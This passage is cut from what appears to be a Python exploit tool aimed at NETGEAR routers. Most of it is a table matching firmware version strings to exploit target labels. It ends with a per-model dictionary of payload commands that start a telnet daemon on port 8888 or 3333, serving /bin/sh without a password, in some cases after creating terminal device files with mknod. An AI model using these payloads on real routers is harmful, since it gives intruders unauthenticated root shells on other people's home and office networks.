		"V1.0.9.64_10.2.64"    : "9.64",
		"V1.0.9.88_10.2.88"    : "9.88",
		"V1.0.11.100_10.2.100" : "11.100",
	},
	"R7000P" : {
		"V1.3.1.64_10.1.36" : "1.3.1.64",
		"V1.3.1.44_10.1.23" : "1.3.1.44",
		"V1.3.1.26_10.1.3"  : "1.3.1.26",
		"V1.3.0.20_10.1.1"  : "1.3.0.20",
		"V1.3.0.8_1.0.93"   : "1.3.0.8",
		"V1.2.0.22_1.0.78"  : "1.2.0.22",
		"V1.0.1.14_1.0.59"  : "1.0.1.14",
		"V1.0.0.58_1.0.50"  : "1.0.0.58",
		"V1.0.0.56_1.0.45"  : "1.0.0.56",
		"V1.0.0.50_1.0.35"  : "1.0.0.50",
		"V1.0.0.46_1.0.30"  : "1.0.0.46",
		"V1.0.0.44_1.0.27"  : "1.0.0.44",
	},
	"R7100LG" : {
		"V1.0.0.52_1.0.6" : "1.0.0.52",
		"V1.0.0.50_1.0.6" : "1.0.0.50",
		"V1.0.0.48_1.0.6" : "1.0.0.48",
		"V1.0.0.46_1.0.6" : "1.0.0.46",
		"V1.0.0.42_1.0.6" : "1.0.0.42",
		"V1.0.0.40_1.0.6" : "1.0.0.40",
		"V1.0.0.38_1.0.6" : "1.0.0.38",
		"V1.0.0.36_1.0.6" : "1.0.0.36",
		"V1.0.0.34_1.0.6" : "1.0.0.34",
		"V1.0.0.32_1.0.6" : "1.0.0.32",
		"V1.0.0.30_1.0.6" : "1.0.0.30",
		"V1.0.0.28_1.0.6" : "1.0.0.28",
		"V1.0.0.24_1.0.6" : "1.0.0.24",
	},
	"R7300" : {
		"V1.0.0.74_1.0.29" : "1.0.0.74",
		"V1.0.0.70_1.0.25" : "1.0.0.70",
		"V1.0.0.68_1.0.24" : "1.0.0.68",
		"V1.0.0.62_1.0.21" : "1.0.0.62",
		"V1.0.0.60_1.0.20" : "1.0.0.60",
		"V1.0.0.56_1.0.18" : "1.0.0.56",
		"V1.0.0.54_1.0.17" : "1.0.0.54",
		"V1.0.0.52_1.0.16" : "1.0.0.52",
		"V1.0.0.46_1.0.13" : "1.0.0.46",
		"V1.0.0.44_1.0.12" : "1.0.0.44",
		"V1.0.0.32_1.0.6"  : "1.0.0.32",
		"V1.0.0.26_1.0.6"  : "1.0.0.26",
	},
	"R7850" : {
		"V1.0.5.48_10.0.42" : "1.0.5.48",
		"V1.0.4.46_10.0.22" : "1.0.4.46",
		"V1.0.4.42_10.0.12" : "1.0.4.42",
	},
	"R7900" : {
		"V1.0.4.22_10.0.44" : "1.0.4.22",
		"V1.0.3.18_10.0.42" : "1.0.3.18",
		"V1.0.3.10_10.0.38" : "1.0.3.10",
		"V1.0.3.8_10.0.37"  : "1.0.3.8",
		"V1.0.2.16_10.0.32" : "1.0.2.16",
		"V1.0.2.10_10.0.29" : "1.0.2.10",
		"V1.0.1.26_10.0.23" : "1.0.1.26",
		"V1.0.1.18_10.0.20" : "1.0.1.18",
		"V1.0.1.12_10.0.17" : "1.0.1.12",
		"V1.0.1.8_10.0.14"  : "1.0.1.8",
		"V1.0.1.4_10.0.12"  : "1.0.1.4",
		"V1.0.0.10_10.0.7"  : "1.0.0.10",
		"V1.0.0.8_10.0.5"   : "1.0.0.8",
		"V1.0.0.6_10.0.4"   : "1.0.0.6",
		"V1.0.0.2_10.0.1"   : "1.0.0.2",
	},
	"R8000" : {
		"V1.0.4.46_10.1.63" : "1.0.4.46",
		"V1.0.4.28_10.1.54" : "1.0.4.28",
		"V1.0.4.18_10.1.49" : "1.0.4.18",
		"V1.0.4.12_10.1.46" : "1.0.4.12",
		"V1.0.4.4_1.1.42"   : "1.0.4.4",
		"V1.0.4.2_1.1.41"   : "1.0.4.2",
		"V1.0.3.54_1.1.37"  : "1.0.3.54",
		"V1.0.3.48_1.1.33"  : "1.0.3.48",
		"V1.0.3.46_1.1.32"  : "1.0.3.46",
		"V1.0.3.36_1.1.25"  : "1.0.3.36",
		"V1.0.3.32_1.1.21"  : "1.0.3.32",
		"V1.0.3.26_1.1.18"  : "1.0.3.26",
		"V1.0.3.4_1.1.2"    : "1.0.3.4",
		"V1.0.2.46_1.0.97"  : "1.0.2.46",
		"V1.0.2.44_1.0.96"  : "1.0.2.44",
		"V1.0.1.16_1.0.74"  : "1.0.1.16",
		"V1.0.0.110_1.0.70" : "1.0.0.110",
		"V1.0.0.108_1.0.62" : "1.0.0.108",
		"V1.0.0.102_1.0.45" : "1.0.0.102",
		"V1.0.0.100_1.0.44" : "1.0.0.100",
		"V1.0.0.90_1.0.39"  : "1.0.0.90",
		"V1.0.0.76_1.0.32"  : "1.0.0.76",
		"V1.0.0.74_1.0.31"  : "1.0.0.74",
		"V1.0.0.68_1.0.27"  : "1.0.0.68",
		"V1.0.0.46_1.0.17"  : "1.0.0.46",
	},
	"R8300" : {
		# These version strings may be slightly off. Versions 1.0.2.128 and 1.0.2.130 only used
		# the short versions, rather than the full version string like other models.
		"V1.0.2.130"        : "1.0.2.130",
		"V1.0.2.128"        : "1.0.2.128",
		"V1.0.2.122_1.0.94" : "1.0.2.122",
		"V1.0.2.116_1.0.90" : "1.0.2.116",
		"V1.0.2.106_1.0.85" : "1.0.2.106",
		"V1.0.2.100_1.0.82" : "1.0.2.100",
		"V1.0.2.94_1.0.79"  : "1.0.2.94",
		"V1.0.2.86_1.0.75"  : "1.0.2.86",
		"V1.0.2.80_1.0.71"  : "1.0.2.80",
		"V1.0.2.48_1.0.52"  : "1.0.2.48",
	},
	"R8500" : {
		"V1.0.2.130_1.0.99" : "1.0.2.130",
		"V1.0.2.128_1.0.97" : "1.0.2.128",
		"V1.0.2.122_1.0.94" : "1.0.2.122",
		"V1.0.2.116_1.0.90" : "1.0.2.116",
		"V1.0.2.106_1.0.85" : "1.0.2.106",
		"V1.0.2.100_1.0.82" : "1.0.2.100",
		"V1.0.2.94_1.0.79"  : "1.0.2.94",
		"V1.0.2.86_1.0.75"  : "1.0.2.86",
		"V1.0.2.80_1.0.71"  : "1.0.2.80",
		"V1.0.2.64_1.0.62"  : "1.0.2.64",
		"V1.0.2.54_1.0.56"  : "1.0.2.54",
		"V1.0.2.30_1.0.43"  : "1.0.2.30",
		"V1.0.2.26_1.0.41"  : "1.0.2.26",
		"V1.0.0.56_1.0.28"  : "1.0.0.56",
		"V1.0.0.52_1.0.26"  : "1.0.0.52",
		"V1.0.0.42_1.0.23"  : "1.0.0.42",
		"V1.0.0.28_1.0.15"  : "1.0.0.28",
	},
	"RS400" : {
		"V1.5.0.34_10.0.33" : "1.5.0.34",
	},
	"WGR614V8" : {
		"V1.2.10_21.0.52"   : "1.2.10",
		"V1.2.10_21.0.52NA" : "1.2.10NA",
		"V1.1.24_14.0.43"   : "1.1.24",
		"V1.1.24_14.0.43NA" : "1.1.24NA",
		"V1.1.2_1.0.23"     : "1.1.2",
		"V1.1.2_1.0.23NA"   : "1.1.2NA",
		"V1.1.11_6.0.36"    : "1.1.11",
		"V1.1.11_6.0.36NA"  : "1.1.11NA",
		"V1.1.1_1.0.20NA"   : "1.1.1NA",
		"V1.1.20_7.0.37"    : "1.1.20",
		"V1.1.20_7.0.37NA"  : "1.1.20NA",
	},
	"WGR614V9" : {
		"V1.2.32_43.0.46"   : "1.2.32",
		"V1.2.32_43.0.46NA" : "1.2.32NA",
		"V1.2.30_41.0.44"   : "1.2.30",
		"V1.2.30_41.0.44NA" : "1.2.30NA",
		"V1.2.24_37.0.35"   : "1.2.24",
		"V1.2.24_37.0.35NA" : "1.2.24NA",
		"V1.2.6_18.0.17"    : "1.2.6",
		"V1.2.6_18.0.17NA"  : "1.2.6NA",
		"V1.2.2_14.0.13"    : "1.2.2",
		"V1.2.2_14.0.13NA"  : "1.2.2NA",
		"V1.0.18_8.0.9PT"   : "1.0.18",
		"V1.0.18_8.0.9NA"   : "1.0.18NA",
		"V1.0.15_4.0.3"     : "1.0.15",
		"V1.0.15_4.0.3NA"   : "1.0.15NA",
		"V1.0.9_1.0.1NA"    : "1.0.9NA",
	},
	"WGR614V10" : {
		"V1.0.2.66_60.0.90"   : "1.0.2.66",
		"V1.0.2.66_60.0.90NA" : "1.0.2.66NA",
		"V1.0.2.60_60.0.85"   : "1.0.2.60",
		"V1.0.2.60_60.0.85NA" : "1.0.2.60NA",
		"V1.0.2.58_60.0.84NA" : "1.0.2.58NA",
		"V1.0.2.54_60.0.82"   : "1.0.2.54",
		"V1.0.2.54_60.0.82NA" : "1.0.2.54NA",
		"V1.0.2.26_51.0.59"   : "1.0.2.26",
		"V1.0.2.26_51.0.59NA" : "1.0.2.26NA",
		"V1.0.2.18_47.0.52"   : "1.0.2.18",
		"V1.0.2.18_47.0.52NA" : "1.0.2.18NA",
	},
	"WGT624V4" : {
		"V2.0.13_2.0.15NA" : "2.0.13.2",
		"V2.0.13_2.0.14"   : "2.0.13",
		"V2.0.13_2.0.14NA" : "2.0.13NA",
		"V2.0.12_2.0.12"   : "2.0.12",
		"V2.0.12_2.0.12NA" : "2.0.12NA",
		"V2.0.6_2.0.6NA"   : "2.0.6NA",
	},
	"WN2500RP" : {
		"V1.0.0.30_1.0.58" : "1.0.0.30",
		"V1.0.0.26_1.0.54" : "1.0.0.26",
		"V1.0.0.24_1.0.53" : "1.0.0.24",
	},
	"WN2500RPV2" : {
		"V1.0.1.54_1.0.68" : "1.0.1.54",
		"V1.0.1.50_1.0.64" : "1.0.1.50",
		"V1.0.1.46_1.0.60" : "1.0.1.46",
		"V1.0.1.42_1.0.56" : "1.0.1.42",
		"V1.0.0.30_1.0.41" : "1.0.0.30",
	},
	"WN3000RP" : {
		"V1.0.2.64_1.1.86" : "1.0.2.64",
		"V1.0.1.36_1.1.47" : "1.0.1.36",
		"V1.0.1.34_1.1.46" : "1.0.1.34",
		"V1.0.1.18_1.1.24" : "1.0.1.18",
		"V1.0.0.12_1.0.12" : "1.0.0.12",
	},
	"WN3100RP" : {
		"V1.0.0.20_1.0.22" : "1.0.0.20",
		"V1.0.0.16_1.0.20" : "1.0.0.16",
		"V1.0.0.14_1.0.19" : "1.0.0.14",
		"V1.0.0.6_1.0.12"  : "1.0.0.6",
	},
	"WN3500RP" : {
		"V1.0.0.22_1.0.62" : "1.0.0.22",
		"V1.0.0.20_1.0.60" : "1.0.0.20",
		"V1.0.0.18_1.0.59" : "1.0.0.18",
		"V1.0.0.16_1.0.58" : "1.0.0.16",
		"V1.0.0.14_1.0.54" : "1.0.0.14",
		"V1.0.0.12_1.0.49" : "1.0.0.12",
	},
	"WNCE3001" : {
		"V1.0.0.50_1.0.35" : "1.0.0.50",
		"V1.0.0.46_1.0.33" : "1.0.0.46",
		"V1.0.0.44_1.0.32" : "1.0.0.44",
		"V1.0.0.38"        : "1.0.0.38",
	},
	"WNDR3300" : {
		"V1.0.45_1.0.45"         : "1.0.45",
		"V1.0.45_1.0.45NA"       : "1.0.45NA",
		"V1.0.29_1.0.29"         : "1.0.29",
		"V1.0.29_1.0.29NA"       : "1.0.29NA",
		"V1.0.27_1.0.27NA"       : "1.0.27NA",
		"V1.0.26_1.0.26"         : "1.0.26",
		"V1.0.26_1.0.26NA"       : "1.0.26NA",
		"V1.0.23_1.0.23NA"       : "1.0.23NA",
		"Version Detection Fail" : "1.0.14",
		"Version Detection Fail" : "1.0.14NA",
	},
	"WNDR3300V2" : {
		"V1.0.0.26_11.0.26NA" : "1.0.0.26",
	},
	"WNDR3400" : {
		"V1.0.0.52_20.0.60" : "1.0.0.52",
		"V1.0.0.50_20.0.59" : "1.0.0.50",
		"V1.0.0.38_16.0.48" : "1.0.0.38",
		"V1.0.0.34_15.0.42" : "1.0.0.34",
	},
	"WNDR3400V2" : {
		"V1.0.0.54_1.0.82" : "1.0.0.54",
		"V1.0.0.52_1.0.81" : "1.0.0.52",
		"V1.0.0.38_1.0.61" : "1.0.0.38",
		"V1.0.0.34_1.0.52" : "1.0.0.34",
		"V1.0.0.16_1.0.34" : "1.0.0.16",
		"V1.0.0.12_1.0.30" : "1.0.0.12",
	},
	"WNDR3400V3" : {
		"V1.0.1.24_1.0.67" : "1.0.1.24",
		"V1.0.1.22_1.0.66" : "1.0.1.22",
		"V1.0.1.18_1.0.63" : "1.0.1.18",
		"V1.0.1.16_1.0.62" : "1.0.1.16",
		"V1.0.1.14_1.0.61" : "1.0.1.14",
		"V1.0.1.12_1.0.58" : "1.0.1.12",
		"V1.0.1.8_1.0.56"  : "1.0.1.8",
		"V1.0.1.4_1.0.52"  : "1.0.1.4",
		"V1.0.1.2_1.0.51"  : "1.0.1.2",
		"V1.0.0.48_1.0.48" : "1.0.0.48",
		"V1.0.0.46_1.0.45" : "1.0.0.46",
		"V1.0.0.38_1.0.40" : "1.0.0.38",
		"V1.0.0.22_1.0.29" : "1.0.0.22",
		"V1.0.0.20_1.0.28" : "1.0.0.20",
	},
	"WNDR3700V3" : {
		"V1.0.0.42_1.0.33" : "1.0.0.42",
		"V1.0.0.38_1.0.31" : "1.0.0.38",
		"V1.0.0.36_1.0.30" : "1.0.0.36",
		"V1.0.0.30_1.0.27" : "1.0.0.30",
		"V1.0.0.22_1.0.17" : "1.0.0.22",
		"V1.0.0.18_1.0.14" : "1.0.0.18",
	},
	"WNDR4000" : {
		"V1.0.2.10_9.1.89" : "1.0.2.10",
		"V1.0.2.6_9.1.87"  : "1.0.2.6",
		"V1.0.2.4_9.1.86"  : "1.0.2.4",
		"V1.0.2.2_9.1.84"  : "1.0.2.2",
		"V1.0.0.94_9.1.81" : "1.0.0.94",
		"V1.0.0.90_9.1.79" : "1.0.0.90",
		"V1.0.0.88_9.1.77" : "1.0.0.88",
		"V1.0.0.82_8.0.71" : "1.0.0.82",
		"V1.0.0.66_8.0.55" : "1.0.0.66",
	},
	"WNDR4500" : {
		"V1.0.1.46_1.0.76" : "1.0.1.46",
		"V1.0.1.40_1.0.68" : "1.0.1.40",
		"V1.0.1.38_1.0.64" : "1.0.1.38",
		"V1.0.1.36_1.0.63" : "1.0.1.36",
		"V1.0.1.20_1.0.40" : "1.0.1.20",
		"V1.0.1.18_1.0.36" : "1.0.1.18",
		"V1.0.1.6_1.0.24"  : "1.0.1.6",
		"V1.0.0.58_1.0.13" : "1.0.0.58",
		"V1.0.0.50_1.0.12" : "1.0.0.50",
		"V1.0.0.40_1.0.10" : "1.0.0.40",
	},
	"WNDR4500V2" : {
		"V1.0.0.72_1.0.45" : "1.0.0.72",
		"V1.0.0.68_1.0.42" : "1.0.0.68",
		"V1.0.0.64_1.0.40" : "1.0.0.64",
		"V1.0.0.62_1.0.39" : "1.0.0.62",
		"V1.0.0.60_1.0.38" : "1.0.0.60",
		"V1.0.0.56_1.0.36" : "1.0.0.56",
		"V1.0.0.54_1.0.33" : "1.0.0.54",
		"V1.0.0.50_1.0.30" : "1.0.0.50",
		"V1.0.0.42_1.0.25" : "1.0.0.42",
		"V1.0.0.36_1.0.21" : "1.0.0.36",
		"V1.0.0.26_1.0.16" : "1.0.0.26",
	},
	"WNR834BV2" : {
		"V2.1.13_2.1.13"   : "2.1.13",
		"V2.1.13_2.1.13NA" : "2.1.13NA",
		"V2.0.8_2.0.8"     : "2.0.8",
		"V2.0.8_2.0.8NA"   : "2.0.8NA",
		"V1.0.32_1.0.32"   : "1.0.32",
		"V1.0.32_1.0.32NA" : "1.0.32NA",
	},
	"WNR1000V3" : {
		"V1.0.2.72_60.0.96"   : "1.0.2.72",
		"V1.0.2.72_60.0.96NA" : "1.0.2.72NA",
		"V1.0.2.68_60.0.93"   : "1.0.2.68",
		"V1.0.2.68_60.0.93NA" : "1.0.2.68NA",
		"V1.0.2.62_60.0.87"   : "1.0.2.62",
		"V1.0.2.62_60.0.87NA" : "1.0.2.62NA",
		"V1.0.2.60_60.0.86WW" : "1.0.2.60",
		"V1.0.2.60_60.0.86NA" : "1.0.2.60NA",
		"V1.0.2.54_60.0.82"   : "1.0.2.54",
		"V1.0.2.54_60.0.82NA" : "1.0.2.54NA",
		"V1.0.2.28_52.0.60"   : "1.0.2.28",
		"V1.0.2.28_52.0.60NA" : "1.0.2.28NA",
		"V1.0.2.26_51.0.59"   : "1.0.2.26",
		"V1.0.2.26_51.0.59NA" : "1.0.2.26NA",
		"V1.0.2.18_47.0.52"   : "1.0.2.18",
		"V1.0.2.18_47.0.52NA" : "1.0.2.18NA",
		"V1.0.2.4_39.0.39"    : "1.0.2.4",
	},
	"WNR2000V2" : {
		"V1.2.0.8_36.0.60"    : "1.2.0.8",
		"V1.2.0.8_36.0.60NA"  : "1.2.0.8NA",
		"V1.2.0.6_36.0.58"    : "1.2.0.6",
		"V1.2.0.6_36.0.58NA"  : "1.2.0.6NA",
		"V1.2.0.4_35.0.57"    : "1.2.0.4",
		"V1.2.0.4_35.0.57NA"  : "1.2.0.4NA",
		"V1.0.0.40_32.0.54"   : "1.0.0.40",
		"V1.0.0.40_32.0.54NA" : "1.0.0.40NA",
		"V1.0.0.35_29.0.47"   : "1.0.0.35",
		"V1.0.0.34_29.0.45"   : "1.0.0.34",
		"V1.0.0.34_29.0.45NA" : "1.0.0.34NA",
	},
	"WNR3500" : {
		"V1.0.36_8.0.36NA" : "1.0.36NA",
		"V1.0.30_8.0.30"   : "1.0.30",
		"V1.0.29_8.0.29NA" : "1.0.29NA",
		"V1.0.22_6.0.22"   : "1.0.22",
		"V1.0.22_6.0.22NA" : "1.0.22NA",
		"V1.0.15_1.0.15NA" : "1.0.15NA",
		"V1.0.10_1.0.10NA" : "1.0.10NA",
	},
	"WNR3500V2" : {
		"V1.2.2.28_25.0.85"   : "1.2.2.28",
		"V1.2.2.28_25.0.85NA" : "1.2.2.28NA",
		"V1.0.2.14_24.0.74"   : "1.0.2.14",
		"V1.0.2.14_24.0.74NA" : "1.0.2.14NA",
		"V1.0.2.10_23.0.70"   : "1.0.2.10NA",
		"V1.0.2.10_23.0.70NA" : "1.0.2.10",
		"V1.0.0.64_11.0.51"   : "1.0.0.64",
		"V1.0.0.64_11.0.51NA" : "1.0.0.64NA",
	},
	"WNR3500L" : {
		"V1.2.2.48_35.0.55NA" : "1.2.2.48NA",
		"V1.2.2.44_35.0.53"   : "1.2.2.44",
		"V1.2.2.44_35.0.53NA" : "1.2.2.44NA",
		"V1.2.2.40_34.0.48"   : "1.2.2.40",
		"V1.2.2.40_34.0.48NA" : "1.2.2.40NA",
		"V1.2.2.30_34.0.37"   : "1.2.2.30",
		"V1.2.2.30_34.0.37NA" : "1.2.2.30NA",
		"V1.0.2.50_31.1.25"   : "1.0.2.50",
		"V1.0.2.50_31.1.25NA" : "1.0.2.50NA",
		"V1.0.2.26_30.0.98"   : "1.0.2.26",
		"V1.0.2.26_30.0.98NA" : "1.0.2.26NA",
		"V1.0.0.88_13.0.76"   : "1.0.0.88",
		"V1.0.0.88_13.0.76NA" : "1.0.0.88NA",
		"V1.0.0.86_13.0.75"   : "1.0.0.86",
		"V1.0.0.86_13.0.75NA" : "1.0.0.86NA",
	},
	"WNR3500LV2" : {
		"V1.2.0.56_50.0.96" : "1.2.0.56",
		"V1.2.0.54_50.0.94" : "1.2.0.54",
		"V1.2.0.50_50.0.90" : "1.2.0.50",
		"V1.2.0.48_40.0.88" : "1.2.0.48",
		"V1.2.0.46_40.0.86" : "1.2.0.46",
		"V1.2.0.44_40.0.84" : "1.2.0.44",
		"V1.2.0.40_40.0.80" : "1.2.0.40",
		"V1.2.0.38_40.0.78" : "1.2.0.38",
		"V1.2.0.34_40.0.75" : "1.2.0.34",
		"V1.2.0.32_40.0.74" : "1.2.0.32",
		"V1.2.0.28_40.0.72" : "1.2.0.28",
		"V1.2.0.26_40.0.71" : "1.2.0.26",
		"V1.2.0.20_40.0.68" : "1.2.0.20",
		"V1.2.0.18_40.0.67" : "1.2.0.18",
		"V1.2.0.16_40.0.66" : "1.2.0.16",
		"V1.0.0.14_37.0.50" : "1.0.0.14",
		"V1.0.0.10"         : "1.0.0.10",
	},
	"XR300" : {
		"V1.0.3.38_10.3.30" : "1.0.3.38",
		"V1.0.3.34_10.3.27" : "1.0.3.34",
		"V1.0.3.26_10.3.22" : "1.0.3.26",
		"V1.0.2.24_10.3.21" : "1.0.2.24",
		"V1.0.2.18_10.3.15" : "1.0.2.18",
		"V1.0.1.4_10.1.4"   : "1.0.1.4",
	},
}

# The default command, spawns a telnet daemon on TCP port 8888 (or 3333, when 8888 is already used)
default_commands = {
	# These devices ask for a password if you don't specify the login program with -l
	"AC1450"    : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"D8500"     : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"DC112A"    : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"EX6200"    : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"EX7000"    : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R6200V2"   : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R6250"     : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R6300V2"   : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R6400"     : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R6400V2"   : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R6700"     : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R6700V3"   : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R6900"     : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R6900P"    : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R7000"     : "/bin/utelnetd -p3333 -l/bin/sh -d",
	"R7000P"    : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R7100LG"   : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R7300"     : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R7850"     : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R7900"     : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R8000"     : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R8300"     : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"R8500"     : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"RS400"     : "/bin/utelnetd -p8888 -l/bin/sh -d",
	"XR300"     : "/bin/utelnetd -p8888 -l/bin/sh -d",

	# These devices don't need to create the terminal devices files first
	"WGT624V4"  : "telnetd -p8888 -l/bin/sh",

	# These devices need to create the terminal device files first
	"D6220"      : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"D6300"      : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"D6400"      : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"D7000V2"    : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"DGN2200"    : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"DGN2200M"   : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"DGN2200V4"  : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"DGND3700"   : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"EX3700"     : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"EX3800"     : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"EX3920"     : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"EX6000"     : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"EX6120"     : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"EX6130"     : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"EX6150"     : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"EX6920"     : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"LG2200D"    : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"MBM621"     : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"MBR624GU"   : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"MBR1200"    : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"MBR1515"    : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"MBR1516"    : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"MBRN3000"   : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"MVBR1210C"  : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"R4500"      : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"R6200"      : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"R6300"      : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WGR614V8"   : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WGR614V9"   : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888",
	"WGR614V10"  : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WN2500RP"   : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WN2500RPV2" : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WN3100RP"   : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WN3500RP"   : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WNDR3300"   : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
